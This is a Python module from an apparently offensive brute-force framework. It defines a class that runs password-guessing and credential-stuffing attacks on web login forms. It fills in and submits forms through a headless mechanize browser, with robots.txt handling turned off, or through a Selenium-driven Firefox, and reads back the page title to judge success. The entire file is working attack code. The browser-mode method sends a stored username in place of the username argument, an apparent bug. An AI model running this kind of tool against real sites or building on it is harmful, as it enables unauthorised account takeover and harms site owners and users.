"""
web.py

    Defines the WebBruteforce object for HTTP/web-based attacks.
    Implements a headless and browser mode for attack, and can be
    arbitrarily implemented for any URL endpoint doing authentication.
"""

import time
import bs4
import mechanize
import dataclasses
import argparse
import typing as t

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

from brute.core.base import BruteBase, BruteException

# type alias for HTTP params
Params = dataclasses.InitVar[t.Dict[str, t.Optional[str]]]


@dataclasses.dataclass
class WebBruteforce(BruteBase):
    """
    Parent bruteforce object inherting from base in order
    to extend functionality for attacking HTTP/HTTPs-based web services.
    """

    # represents any key-value parameters needed to work with the endpoint. Should NOT include
    # the username and password field, which should appear seperate in the fields parameter.
    params: Params = None

    # represents a mapping for embedded field elements to find. Values should represent the form
    # params for the specific site to input with.
    fields: Params = {
        "username": None,
        "password": None
    }

    # represents headers to pass with response.
    # TODO: populate and more configurations
    headers: Params = None

    # if set, will not attach to an actual browser process to perform bruteforce
    headless: bool = False


    def __str__(self) -> str:
        return f"{self.name}"


    @classmethod
    def parse_args(cls) -> argparse.Namespace:
        """
        Most of the configurations should be done as part of the plugin module itself,
        but any changes during runtime that involve overriding parameters have options
        implemented here.
        """

        # check if child classes already initialized and parsed arguments
        if cls._args:
            return cls._args

        # check if child classes already initialized an argument parser with options
        if not cls._parser:
            parser: argparse.ArgumentParser = argparse.ArgumentParser(f"{str(cls)} standalone credential stuffing module")
        else:
            parser: argparse.ArgumentParser = cls._parser

        parser.add_argument(
            "--headless", action="store_true",
            help="Execute the attack by without an actual browser or webdriver.",
        )

        """
        parser.add_argument(
            "--override_fields", type=json.loads, dest="override_fields",
            help="Overrides the name of the username/password parameter fields in a dict format {'username': '', 'password': ''}.",
        )

        parser.add_argument(
            "--override_params", type=json.loads, dest="override_params",
            help="Overrides parameters sent as part of the HTTP request in a dict format.",
        )

        parser.add_argument(
            "--override_headers", type=json.loads, dest="override_headers",
            help="Overrides headers sent as part of the HTTP request in a dict format.",
        )
        """

        # set parser, and finalize initialization in subclass
        cls._parser = parser
        return super().parse_args()


    def init(self):
        """
        Initializes the proper browser for authentication based on configuration, and performs
        necessary error-checking.
        """

        # error if no field params are set.
        if not any(self.fields.values()):
            raise BruteException("no input parameters for user/pwd combo given for module.")

        if self.headless:

            # initialize headless browser
            browser = mechanize.Browser()
            browser.set_handle_robots(False)

            # configure before requesting
            cookies = mechanize.CookieJar()
            browser.set_cookiejar(cookies)

            if self.headers is not None:
                browser.addheaders = [(k, v) for k, v in self.headers.items()]
            browser.set_handle_refresh(False)

            # initialize as attribute, and open
            self.browser = browser
            self.browser.open(self.address)

        else:
            self.browser = webdriver.Firefox()
            self.browser.get(self.address)


    def brute(self, username: str, pwd_guess: str) -> str:
        """
        Overrides based on whether we are running headless or browser mode.
        """
        if self.headless:
            return self._headless_brute(username, pwd_guess)
        else:
            return self._driver_brute(username, pwd_guess)


    def _headless_brute(self, username: str, pwd_guess: str) -> str:
        """
        Attempts authentication using a headless browser provided by mechanize. Should be the
        fast and default way to do any type of web-based bruteforcing.
        """
        self.browser.select_form(nr = 0)
        self.browser.form[self.fields["username"]] = username
        self.browser.form[self.fields["password"]] = pwd_guess
        response = self.browser.submit()

        # use bs4 to parse html and return title
        html = bs4.BeautifulSoup(response.read(), "html.parser")
        return html.title.text


    def _driver_brute(self, username: str, pwd_guess: str) -> str:
        """
        Uses a Firefox-based webdriver in order to attempt authentication by
        spawning actual browser processes. Should be used in the situation that
        the headless run does not yield anything successful, and more visibility is needed.
        """

        # find the username input field, and send keys
        user_elem = self.browser.find_element(By.NAME, self.fields["username"])
        user_elem.clear()
        user_elem.send_keys(self.username)

        # find the password input field, and send keys
        pwd_elem = self.browser.find_element(By.NAME, self.fields["password"])
        pwd_elem.clear()
        pwd_elem.send_keys(pwd_guess)

        # press return key to attempt to auth, and wait briefly
        pwd_elem.send_keys(Keys.RETURN)
        time.sleep(2)
        return self.browser.title
